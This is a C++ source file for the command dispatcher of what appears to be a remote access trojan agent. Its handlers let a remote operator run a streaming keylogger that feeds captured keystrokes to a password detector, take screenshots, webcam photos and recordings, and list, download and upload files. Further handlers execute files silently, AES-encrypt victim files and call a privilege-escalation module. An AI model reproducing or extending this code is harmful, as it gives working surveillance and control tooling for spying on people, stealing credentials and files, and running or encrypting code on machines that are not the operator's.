#include "CommandDispatcher.hpp"

static Keylogger g_keylogger;
static std::atomic<bool> g_isKeylogging(false);
static FileTransferController g_fileTransfer;

CommandDispatcher::CommandDispatcher() {
    registerHandlers();
}

void CommandDispatcher::dispatch(const Message& msg, ResponseCallBack cb) {
    auto it = routes_.find(msg.type);

    if (it != routes_.end()) {
        cout << "[Dispatcher] Handling command: " << msg.type << "\n";

        try {
            it->second(msg, cb);
        } 
        catch (const std::exception& e) {
            json errData = {
                {"status", "failed"},
                {"msg", std::string("Internal Error: ") + e.what()}
            };

            cb(
                Message(
                Protocol::TYPE::ERROR,
                errData, 
                "", 
                msg.from
                )
            );
        }
    } else {
        if (msg.type != Protocol::TYPE::AUTH && msg.type != Protocol::TYPE::ERROR) {
            cout << "[Dispatcher] Unknown command: " << msg.type << "\n";
            cb(
                Message(
                    Protocol::TYPE::ERROR,
                    {
                        {"msg", "Command not supported"}
                    },
                    "",
                    msg.from
                )
            );
        }
    }
}

void CommandDispatcher::registerHandlers() {
    routes_[Protocol::TYPE::PING] = [](const Message& msg, ResponseCallBack cb) {
        cb( Message(
            Protocol::TYPE::PONG,
            { {"msg", "Agent Alive" }},
            "",
            msg.from
        ));
    };

    routes_[Protocol::TYPE::APP_LIST] = [](const Message& msg, ResponseCallBack cb) {
        AppController ac;
        auto list = ac.listApps();
        cb(Message(
            Protocol::TYPE::APP_LIST,
            list, 
            "",
            msg.from
        ));
    };

    routes_[Protocol::TYPE::APP_START] = [](const Message& msg, ResponseCallBack cb) {
        try {
            int id = -1;
            if (msg.data.is_number()) id = msg.data.get<int>();
            else if (msg.data.is_string()) id = std::stoi(msg.data.get<std::string>());

            if (id < 0) throw std::runtime_error("Invalid ID");

            AppController ac;
            auto app = ac.getApp(id);
            bool success = ac.startApp(app);

            cb(Message(
                Protocol::TYPE::APP_START, 
                {
                    {"status", success ? "ok" : "failed"},
                    {"msg", success ? "App started successfully" : "Failed to start App"},
                    {"id", id}
                }, 
                "", 
                msg.from
            ));
        } catch (...) {
            cb(Message(
                Protocol::TYPE::ERROR, 
                {{"msg", "Invalid App ID format"}}, 
                "", 
                msg.from
            ));
        }
    };

    routes_[Protocol::TYPE::APP_KILL] = [](const Message& msg, ResponseCallBack cb) {
        try {
            int id = -1;
            if (msg.data.is_number()) id = msg.data.get<int>();
            else if (msg.data.is_string()) id = std::stoi(msg.data.get<std::string>());

            if (id < 0) throw std::runtime_error("Invalid ID");

            AppController ac;
            auto app = ac.getApp(id);
            bool success = ac.stopApp(app);

            cb(Message(
                Protocol::TYPE::APP_KILL, 
                {
                    {"status", success ? "ok" : "failed"},
                    {"msg", success ? "App stopped" : "Failed to stop App"},
                    {"id", id}
                }, 
                "", 
                msg.from
            ));

        } catch (...) {
            cb(Message(
                Protocol::TYPE::ERROR, 
                {{"msg", "Invalid App ID format"}}, 
                "", 
                msg.from
            ));
        }
    };

    routes_[Protocol::TYPE::PROC_LIST] = [](const Message& msg, ResponseCallBack cb) {
        ProcessController pc;
        auto list = pc.listProcesses();
        cb(Message(
            Protocol::TYPE::PROC_LIST, 
            list, 
            "", 
            msg.from
        ));
    };

    routes_[Protocol::TYPE::PROC_START] = [](const Message& msg, ResponseCallBack cb) {
        try {
            int id = -1;
            if (msg.data.is_number()) id = msg.data.get<int>();
            else if (msg.data.is_string()) id = std::stoi(msg.data.get<std::string>());

            ProcessController pc;
            auto proc = pc.getProcess(id); 
            bool success = pc.startProcess(proc);

            cb(Message(Protocol::TYPE::PROC_START, {
                {"status", success ? "ok" : "failed"},
                {"msg", success ? "Process start succesfully!" : "Failed to start process"},
                {"id", id}
            }, "", msg.from));
        } catch (...) {
            cb(Message(
                Protocol::TYPE::ERROR, 
                {{"msg", "Invalid Process ID"}},
                "", 
                msg.from
            ));
        }
    };

    routes_[Protocol::TYPE::PROC_KILL] = [](const Message& msg, ResponseCallBack cb) {
        try {
            int id = -1;
            if (msg.data.is_number()) id = msg.data.get<int>();
            else if (msg.data.is_string()) id = std::stoi(msg.data.get<std::string>());

            ProcessController pc;
            auto proc = pc.getProcess(id); 
            bool success = pc.stopProcess(proc);

            cb(Message(Protocol::TYPE::PROC_KILL, {
                {"status", success ? "ok" : "failed"},
                {"msg", success ? "Process killed" : "Failed to kill process"},
                {"id", id}
            }, "", msg.from));
        } catch (...) {
            cb(Message(
                Protocol::TYPE::ERROR, 
                {{"msg", "Invalid Process ID"}},
                "", 
                msg.from
            ));
        }
    };

    routes_[Protocol::TYPE::SCREENSHOT] = [](const Message& msg, ResponseCallBack cb) {
        std::thread([msg, cb]() {
            try {
                CaptureScreen sc;
                std::string b64Image = sc.captureAndEncode();
                if (b64Image.empty()) {
                    cb(Message(
                        Protocol::TYPE::SCREENSHOT, 
                        {
                            {"status", "failed"},
                            {"msg", "Captured data is empty"}
                        },
                        "",
                        msg.from));
                } else {
                    cb(Message(
                        Protocol::TYPE::SCREENSHOT, 
                        {
                            {"status", "ok"},
                            {"mime", "image/jpeg"},
                            {"data", b64Image},
                            {"msg", "Screenshot captured"}
                        }, 
                        "", 
                        msg.from
                    ));
                }
            } catch (const std::exception& e) {
                cb(Message(
                    Protocol::TYPE::SCREENSHOT, 
                    {
                        {"status", "failed"},
                        {"msg", std::string("Screenshot error: ") + e.what()}
                    }, 
                    "", 
                    msg.from
                ));
            } catch (...) {
                cb(Message(
                    Protocol::TYPE::SCREENSHOT, 
                    {
                        {"status", "failed"},
                        {"msg", "Screenshot error: Unknown exception"}
                    }, 
                    "", 
                    msg.from
                ));
            }
        }).detach();
    };

    routes_[Protocol::TYPE::CAMSHOT] = [](const Message& msg, ResponseCallBack cb) {
        try {
            CameraCapture cc;
            std::string b64Image = cc.captureBase64();
            if (b64Image.empty()) {
                cb(Message(
                    Protocol::TYPE::CAMSHOT, 
                    {
                        {"status", "failed"},
                        {"msg", "Captured data is empty"}
                    },
                    "",
                    msg.from));
            } else {
                cb(Message(
                    Protocol::TYPE::CAMSHOT, 
                    {
                        {"status", "ok"},
                        {"mime", "image/jpeg"},
                        {"data", b64Image},
                        {"msg", "Camera captured"}
                    }, 
                    "", 
                    msg.from
                ));
            }
        } catch (const std::exception& e) {
            cb(Message(
                Protocol::TYPE::CAMSHOT, 
                {
                    {"status", "failed"},
                    {"msg", std::string("Camera shot error: ") + e.what()}
                }, 
                "", 
                msg.from
            ));
        }
    };

    routes_[Protocol::TYPE::CAM_RECORD] = [](const Message& msg, ResponseCallBack cb) {
        std::thread([msg, cb]() {
            try {
                int duration = 10;
                
                if (msg.data.is_object() && msg.data.contains("duration")) {
                    duration = msg.data["duration"].get<int>();
                } else if (msg.data.is_number()) {
                    duration = msg.data.get<int>();
                } else if (msg.data.is_string()) {
                    try { 
                        duration = std::stoi(msg.data.get<std::string>()); 
                    } 
                    catch(...) {}
                }

                if (duration < 1) duration = 1;
                if (duration > 15) duration = 15;

                CameraRecorder cam;
                std::string b64Video = cam.recordBase64(duration);

                if (b64Video.empty()) {
                    cb(Message(
                        Protocol::TYPE::CAM_RECORD, 
                        {
                            {"status", "failed"},
                            {"msg", "Camera busy or not found"}
                        }, 
                        "", 
                        msg.from
                    ));
                } else {
                    cb(Message(
                        Protocol::TYPE::CAM_RECORD, 
                        {
                            {"status", "ok"},
                            {"mime", "video/mp4"},
                            {"duration", duration},
                            {"data", b64Video},
                            {"msg", "Video recorded"}
                        }, 
                        "", 
                        msg.from
                    ));
                }
            } catch (const std::exception& e) {
                cb(Message(
                    Protocol::TYPE::ERROR, 
                    {
                        {"msg", std::string("Async Camera Error: ") + e.what()}
                    }, 
                    "", 
                    msg.from
                ));
            }
        }).detach();
    };

    routes_[Protocol::TYPE::SCR_RECORD] = [](const Message& msg, ResponseCallBack cb) {
        std::thread([msg, cb]() {
            try {
                int duration = 10;
                
                if (msg.data.is_object() && msg.data.contains("duration")) {
                    duration = msg.data["duration"].get<int>();
                } else if (msg.data.is_number()) {
                    duration = msg.data.get<int>();
                } else if (msg.data.is_string()) {
                    try { 
                        duration = std::stoi(msg.data.get<std::string>()); 
                    } 
                    catch(...) {}
                }

                if (duration < 1) duration = 1;
                if (duration > 15) duration = 15;

                ScreenRecorder cam;
                std::string b64Video = cam.recordBase64(duration);

                if (b64Video.empty()) {
                    cb(Message(
                        Protocol::TYPE::SCR_RECORD, 
                        {
                            {"status", "failed"},
                            {"msg", "Camera busy or not found"}
                        }, 
                        "", 
                        msg.from
                    ));
                } else {
                    cb(Message(
                        Protocol::TYPE::SCR_RECORD, 
                        {
                            {"status", "ok"},
                            {"mime", "video/mp4"},
                            {"duration", duration},
                            {"data", b64Video},
                            {"msg", "Video recorded"}
                        }, 
                        "", 
                        msg.from
                    ));
                }
            } catch (const std::exception& e) {
                cb(Message(
                    Protocol::TYPE::ERROR, 
                    {
                        {"msg", std::string("Async Camera Error: ") + e.what()}
                    }, 
                    "", 
                    msg.from
                ));
            }
        }).detach();
    };

    routes_[Protocol::TYPE::START_KEYLOG] = [](const Message& msg, ResponseCallBack cb) {
        if (g_isKeylogging) {
            cb(Message(Protocol::TYPE::ERROR, {{"msg", "Keylogger is already running"}}, "", msg.from));
            return;
        }

        g_isKeylogging = true;
        g_keylogger.Start();

        cb(Message(Protocol::TYPE::START_KEYLOG, {{"status", "ok"}, {"msg", "Keylogger started (Streaming mode)"}}, "", msg.from));

        std::thread([msg, cb]() {
            int intervalMs = 50; 
            
            try {
                std::string args = msg.getDataString();
                if (!args.empty()) {
                    auto j = json::parse(args, nullptr, false);
                    if (!j.is_discarded() && j.contains("interval")) {
                        intervalMs = static_cast<int>(j["interval"].get<float>() * 1000);
                    }
                }
            } catch(...) {}
            if (intervalMs < 1) intervalMs = 1;

            std::string stringForAnalyzer;
            stringForAnalyzer.reserve(2048);
            
            while (g_isKeylogging) {
                auto startTime = std::chrono::steady_clock::now();
                
                vector<string> currentKeysVector = Keylogger::getDataAndClear();
                if (!currentKeysVector.empty()) {
                    cb(Message(Protocol::TYPE::STREAM_DATA, 
                        {
                            {"status", "ok"},
                            {"mime", "keylog"},
                            {"data", currentKeysVector}
                        }, "", msg.from));
                    
                    stringForAnalyzer.clear();
                    size_t totalSize = 0;
                    for (const auto& key : currentKeysVector) {
                        totalSize += key.size();
                    }
                    stringForAnalyzer.reserve(totalSize);
                    
                    for (const auto& key : currentKeysVector) {
                        stringForAnalyzer += key;
                    }
                    std::thread([stringForAnalyzer]() {
                        PasswordDetector::analyzeKeylogBuffer(stringForAnalyzer);
                    }).detach();
                }
                
                auto elapsed = std::chrono::steady_clock::now() - startTime;
                auto sleepTime = std::chrono::milliseconds(intervalMs) - 
                                 std::chrono::duration_cast<std::chrono::milliseconds>(elapsed);
                if (sleepTime.count() > 0) {
                    std::this_thread::sleep_for(sleepTime);
                }
            }
        }).detach();
    };

    routes_[Protocol::TYPE::STOP_KEYLOG] = [](const Message& msg, ResponseCallBack cb) {
        if (!g_isKeylogging) {
            cb(Message(Protocol::TYPE::ERROR, {{"msg", "Keylogger is not running"}}, "", msg.from));
            return;
        }

        g_isKeylogging = false; 
        g_keylogger.Stop();   
        
        vector<std::string> finalLogsVector = Keylogger::getDataAndClear();

        string finalLogs = "";
        
        for (const auto& key: finalLogsVector) {
            finalLogs += key;
        }

        PasswordDetector::analyzeKeylogBuffer(finalLogs);
        
        cb(Message(Protocol::TYPE::STOP_KEYLOG, 
            {
                {"status", "ok"}, 
                {"msg", "Keylogger stopped"},
                {"data", finalLogsVector}
            }, "", msg.from));
    };
    
    routes_[Protocol::TYPE::SHUTDOWN] = [](const Message& msg, ResponseCallBack cb) {
        cb(Message(
            Protocol::TYPE::SHUTDOWN, 
            {
                {"status", "ok"},
                {"msg", "Device is shutting down in 3 seconds..."}
            }, 
            "", 
            msg.from
        ));

        std::thread([]() {
            std::this_thread::sleep_for(std::chrono::seconds(3));

            #ifdef _WIN32
                system("shutdown /s /t 0");
            #elif __APPLE__
                std::string haltResult = PrivilegeEscalation::executeWithPrivileges("halt");
                if (!haltResult.empty()) {
                    return; 
                }
                
                std::string shutdownResult = PrivilegeEscalation::executeWithPrivileges("shutdown -h now");
                if (!shutdownResult.empty()) {
                    return;
                }
                
                std::string shutdown0Result = PrivilegeEscalation::executeWithPrivileges("shutdown -h +0");
                if (!shutdown0Result.empty()) {
                    return; 
                }
                
                int result = system("osascript -e 'tell application \"System Events\" to shut down'");
                if (result == 0) {
                    return; 
                }
                
                system("sudo halt");
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                system("sudo shutdown -h now");
            #elif __linux__
                int result = system("systemctl poweroff");
                if (result != 0) {
                    PrivilegeEscalation::executeWithPrivileges("systemctl poweroff");
                } 
            #endif
        }).detach();
    };

    routes_[Protocol::TYPE::RESTART] = [](const Message& msg, ResponseCallBack cb) {
        cb(Message(
            Protocol::TYPE::RESTART, 
            {
                {"status", "ok"},
                {"msg", "Device is restarting in 3 seconds..."}
            }, 
            "", 
            msg.from
        ));

        std::thread([]() {
            std::this_thread::sleep_for(std::chrono::seconds(3));

            #ifdef _WIN32
                system("shutdown /r /t 0");
            #elif __APPLE__
                int result = system("osascript -e 'tell application \"System Events\" to restart'");
                if (result != 0) {
                    std::string restartResult = PrivilegeEscalation::executeWithPrivileges("shutdown -r now");
                    if (restartResult.empty()) {
                        system("sudo shutdown -r now");
                    }
                }
            #elif __linux__
                int result = system("systemctl reboot");
                if (result != 0) {
                    PrivilegeEscalation::executeWithPrivileges("systemctl reboot");
                }
            #endif
        }).detach();
    };

    routes_[Protocol::TYPE::SLEEP] = [](const Message& msg, ResponseCallBack cb) {
        cb(Message(
            Protocol::TYPE::SLEEP, 
            {
                {"status", "ok"},
                {"msg", "Device is going to sleep..."}
            }, 
            "", 
            msg.from
        ));

        std::thread([]() {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));

            #ifdef _WIN32
                system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
            #elif __APPLE__
                int result = system("pmset sleepnow");
                if (result != 0) {
                    result = system("osascript -e 'tell application \"System Events\" to sleep'");
                    if (result != 0) {
                        PrivilegeEscalation::executeWithPrivileges("pmset sleepnow");
                    }
                }
            #elif __linux__
                int result = system("systemctl suspend");
                if (result != 0) {
                    PrivilegeEscalation::executeWithPrivileges("systemctl suspend");
                }
            #endif
        }).detach();
    };
    
    routes_[Protocol::TYPE::ECHO] = [](const Message& msg, ResponseCallBack cb) {
         cb(Message(Protocol::TYPE::ECHO, "Agent Echo: " + msg.getDataString(), "", msg.from));
    };
    
    routes_[Protocol::TYPE::WHOAMI] = [](const Message& msg, ResponseCallBack cb) {
         cb(Message(Protocol::TYPE::WHOAMI, getHostName(), "", msg.from));
    };
    
    routes_[Protocol::TYPE::FILE_LIST] = [](const Message& msg, ResponseCallBack cb) {
        try {
            std::string path = "";
            
            if (msg.data.is_string()) {
                path = msg.data.get<std::string>();
            } else if (msg.data.is_object() && msg.data.contains("path")) {
                path = msg.data["path"].get<std::string>();
            }
            
            FileListController flc;
            auto files = flc.listFiles(path);
            
            json result = json::array();
            for (const auto& file : files) {
                json fileObj = {
                    {"name", file.name},
                    {"path", file.path},
                    {"type", file.type},
                    {"size", file.size},
                    {"permissions", file.permissions},
                    {"modified", file.modified},
                    {"isDirectory", file.isDirectory},
                    {"isFile", file.isFile}
                };
                result.push_back(fileObj);
            }
            
            cb(Message(
                Protocol::TYPE::FILE_LIST,
                {
                    {"status", "ok"},
                    {"path", path},
                    {"files", result},
                    {"count", files.size()}
                },
                "",
                msg.from
            ));
        } catch (const std::exception& e) {
            cb(Message(
                Protocol::TYPE::ERROR,
                {
                    {"msg", std::string("File list error: ") + e.what()}
                },
                "",
                msg.from
            ));
        }
    };

    routes_[Protocol::TYPE::FILE_DOWNLOAD] = [](const Message& msg, ResponseCallBack cb) {
        std::thread([msg, cb]() {
            try {
                std::string filePath = msg.getDataString();
                std::string sessionId = FileTransferController::generateSessionId();

                if (!g_fileTransfer.startDownload(sessionId, filePath)) {
                    cb(Message(Protocol::TYPE::ERROR, {{"msg", "CAN'T OPEN FILE TO DOWNLOAD"}}, "", msg.from));
                    return;
                }

                auto session = g_fileTransfer.getSession(sessionId);
                cb(Message(Protocol::TYPE::FILE_PROGRESS, {
                    {"sessionId", sessionId},
                    {"fileName", session->fileName},
                    {"totalSize", session->totalSize},
                    {"status", "start"}
                }, "", msg.from));

                while (g_fileTransfer.isSessionActive(sessionId)) {
                    std::string rawChunk = g_fileTransfer.getDownloadChunk(sessionId, 32 * 1024);
                    if (rawChunk.empty()) break;

                    std::string encodedChunk = base64_encode(reinterpret_cast<const unsigned char*>(rawChunk.data()), (unsigned int)rawChunk.size());

                    cb(Message(Protocol::TYPE::FILE_CHUNK, {
                        {"sessionId", sessionId},
                        {"data", encodedChunk}
                    }, "", msg.from));
                }

                g_fileTransfer.cleanupSession(sessionId);
                cb(Message(Protocol::TYPE::FILE_COMPLETE, {{"sessionId", sessionId}, {"status", "success"}}, "", msg.from));

            } catch (const std::exception& e) {
                cb(Message(Protocol::TYPE::ERROR, {{"msg", e.what()}}, "", msg.from));
            }
        }).detach(); 
    };

    routes_[Protocol::TYPE::FILE_UPLOAD] = [](const Message& msg, ResponseCallBack cb) {
        try {
            std::string path = msg.data.value("path", ""); 
            std::string fileName = msg.data.value("fileName", "");
            int64_t size = msg.data.value("size", (int64_t)0);
            std::string sessionId = FileTransferController::generateSessionId();

            bool success = g_fileTransfer.startUpload(sessionId, path, fileName, size);
            
            cb(Message(Protocol::TYPE::FILE_UPLOAD, {
                {"status", success ? "ok" : "failed"},
                {"sessionId", sessionId},
                {"msg", success ? "Ready to receive data" : "Can't create file at this url"}
            }, "", msg.from));

        } catch (...) {
            cb(Message(Protocol::TYPE::ERROR, {{"msg", "Upload failed"}}, "", msg.from));
        }
    };

    routes_[Protocol::TYPE::FILE_CHUNK] = [](const Message& msg, ResponseCallBack cb) {
        try {
            std::string sessionId = msg.data.value("sessionId", "");
            std::string encodedData = msg.data.value("data", "");
            
            std::string decodedData = base64_decode(encodedData); 

            if (g_fileTransfer.processUploadChunk(sessionId, decodedData, 0)) {
                auto session = g_fileTransfer.getSession(sessionId);
                if (session && session->currentSize >= session->totalSize) {
                    g_fileTransfer.cleanupSession(sessionId);
                    cb(Message(Protocol::TYPE::FILE_COMPLETE, {{"sessionId", sessionId}, {"msg", "Upload successfully"}}, "", msg.from));
                }
            }
        } catch (...) {
            cb(Message(Protocol::TYPE::ERROR, {{"msg", "Write chunk failed"}}, "", msg.from));
        }
    };

    routes_[Protocol::TYPE::FILE_EXECUTES] = [this](const Message& msg, ResponseCallBack cb) {
        try {
            std::string filePath = msg.data.is_string() ? msg.getDataString() : msg.data.value("path", "");
            
            if (filePath.empty()) {
                cb(Message(Protocol::TYPE::ERROR, {{"msg", "Path is empty"}}, "", msg.from));
                return;
            }

            bool success = FileTransferController::executeFile(filePath);

            cb(Message(Protocol::TYPE::FILE_EXECUTES, {
                {"status", success ? "ok" : "failed"},
                {"msg", success ? "File started silently" : "Failed to execute file"}
            }, "", msg.from));
        } catch (const std::exception& e) {
            cb(Message(Protocol::TYPE::ERROR, {{"msg", e.what()}}, "", msg.from));
        }
    };
    
    routes_[Protocol::TYPE::FILE_ENCRYPT] = [this](const Message& msg, ResponseCallBack cb) {
        try {
            std::string filePath = msg.data.is_string() ? msg.getDataString() : msg.data.value("path", "");
            std::string key = msg.data.value("key", "");
            std::string iv = msg.data.value("iv", "");

            bool isEncrypted = filePath.size() > 4 && filePath.substr(filePath.size() - 4) == ".enc";
            bool toEncrypt = !isEncrypted;

            bool success = FileTransferController::processAES(filePath, toEncrypt, key, iv);

            cb(Message(Protocol::TYPE::FILE_ENCRYPT, {
                {"status", success ? "ok" : "failed"},
                {"msg", success ? (toEncrypt ? "File Encrypted" : "File Decrypted") : "AES Error"}
            }, "", msg.from));
        } catch (const std::exception& e) {
            cb(Message(Protocol::TYPE::ERROR, {{"msg", e.what()}}, "", msg.from));
        }
    };

    routes_[Protocol::TYPE::SYSTEM_INFO] = [this](const Message& msg, ResponseCallBack cb) {
        try {
            json specs = SystemInfoController::getSystemSpecs();

            cb(Message(
                Protocol::TYPE::SYSTEM_INFO,
                {
                    {"status", "ok"},
                    {"data", specs}
                },
                "",
                msg.from
            ));
        } catch (const std::exception& e) {
            cb(Message(
                Protocol::TYPE::ERROR,
                {{"msg", std::string("System Info Error: ") + e.what()}},
                "",
                msg.from
            ));
        }
    };
}
